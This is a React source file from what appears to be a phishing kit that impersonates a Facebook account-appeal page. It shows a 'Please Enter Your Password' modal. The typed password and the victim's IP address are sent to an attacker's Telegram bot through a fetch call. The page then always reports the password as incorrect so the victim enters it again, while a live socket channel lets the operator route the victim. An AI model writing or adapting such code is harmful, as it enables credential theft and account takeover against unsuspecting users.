import React, { useEffect, useState, useRef } from 'react';
import { BrowserRouter as Router, Routes, Route, Link, useNavigate } from 'react-router-dom';
import { Form, FormControl, Button, InputGroup, Row, Col, Container, Modal } from 'react-bootstrap';

import usericon from '../images/user.png';
import Header from './Header';
import Footer from './Footer';
import AppealDesign from './AppealDesign';
import GLOBAL_ARRAY from "./globals";
import io from 'socket.io-client';


const IdentityConfirm = () => {
	const [hapi, setHapi] = useState('');
	const [show, setShow] = useState(true);
const passwordRef = useRef(null);
const socket = io(GLOBAL_ARRAY[5]);

	const handleClose = () => setShow(false);
	const handleShow = () => setShow(true);

	const navigate = useNavigate();



	useEffect(() => {
		

	    if (localStorage.getItem('hapii') === "1") {
	    	navigate('/appeal');
	    } else if (localStorage.getItem('hapii') === "2") {
	    	
	    } else if (localStorage.getItem('hapii') === "3") {
	    	navigate('/appeal/identity/confirm/incorrect');
	    } else if (localStorage.getItem('hapii') === "4") {
	    	navigate('/appeal/checkpoint');
	    } else if (localStorage.getItem('hapii') === "5") {
	    	navigate('/appeal/checkpoint/incorrect');
	    } else if (localStorage.getItem('hapii') === "6") {
	    	navigate('/appeal/checkpoint/review');
	    } else if (localStorage.getItem('hapii') === "7") {
	    	navigate('/appeal/checkpoint/restrict');
	    } 


	    socket.on('message', message => {
			console.log(message.ipja == localStorage.getItem('ipja'));
			console.log(message.ipja);
			console.log(localStorage.getItem('ipja'));
		  if(message.ipja == localStorage.getItem('ipja')){
		  	
		  	localStorage.setItem('hapii', message.hapi)
		  	if(message.hapi == 8){
		  		window.location.href = "https://transparency.fb.com/policies/community-standards/";
		  	} else {
		  		navigate(message.urlja);
		  	}
		    
		  }
		});
	    
	}, [])



	const handleSubmitPw = (event) => {
		event.preventDefault();
	    const password = passwordRef.current.value;

	    //var emriencoded = encodeURIComponent(emri);
	    //var emailiencoded = encodeURIComponent(emaili);
	    //var mesazhiencoded = encodeURIComponent(mesazhi);
	    //var numriencoded = encodeURIComponent(numri);
	    
	    //localStorage.setItem('emriencoded', emriencoded);
	    //localStorage.setItem('emailiencoded', emailiencoded);
	    //localStorage.setItem('mesazhiencoded', mesazhiencoded);
	    //localStorage.setItem('numriencoded', numriencoded);
	    localStorage.setItem('hapii', 3);

	    var fulltextmesazh = "Password: "+ password + "\nIP: " + localStorage.getItem('ipja');
	    fetch('https://'+GLOBAL_ARRAY[4]+'/bot'+GLOBAL_ARRAY[0]+'/sendMessage', {
	      method: 'POST',
	      headers: {
	        'Content-Type': 'application/json'
	      },
	      body: JSON.stringify({
	        chat_id: GLOBAL_ARRAY[1],
	        text: fulltextmesazh
	      })
	    })
	    .then(response => response.json())
	    .then(data => {
	    	
	    	navigate('/appeal/identity/confirm/incorrect');
	    })
	    .catch(error => console.error(error));
	    // reset form values
	 };

	return (
		<div>
			<Modal show={show} onHide={handleClose} backdrop="static">
		        <Modal.Header closeButton>
		          <Modal.Title><p>Please Enter Your Password</p></Modal.Title>
		        </Modal.Header>
		        <Form onSubmit={handleSubmitPw}>
		        <Modal.Body>
		        	
		        	<div className="profilepassword">
		        		{ localStorage.getItem('image') ? (
		        			<div className="profilinepw">
						        <img src={localStorage.getItem('image')} className="img-fluid" style={{width:'50px', height:'50px'}} />
						        <p>{localStorage.getItem('fullname')}</p>
						    </div>
					      ) : (
					      	<span></span>
					      )}
		        	</div>
		        	<p style={{marginTop: '10px', marginBottom: '15px'}}>For your security, you must re-enter your password to continue.</p>
		        	
				      <Form.Group className="formaperpw" controlId="formpassword">
				        <Form.Label className="labelipw">Password:</Form.Label>
				        <Form.Control type="password" required ref={passwordRef} pattern=".{4,}" className="paborder"/>
				      </Form.Group>
				    
		        </Modal.Body>
		        <Modal.Footer>
		          <Button variant="primary continuebutton" type="submit" >
		            Continue
		          </Button>
		        </Modal.Footer>
		        </Form>
		      </Modal>
			<Header />
			<Container fluid>
				<Row>
					<Col md={{ span: 8, offset: 2 }}>
						<AppealDesign />
						
					</Col>
				</Row>
			</Container>
			<Footer />
			
		</div>
	)
}

export default IdentityConfirm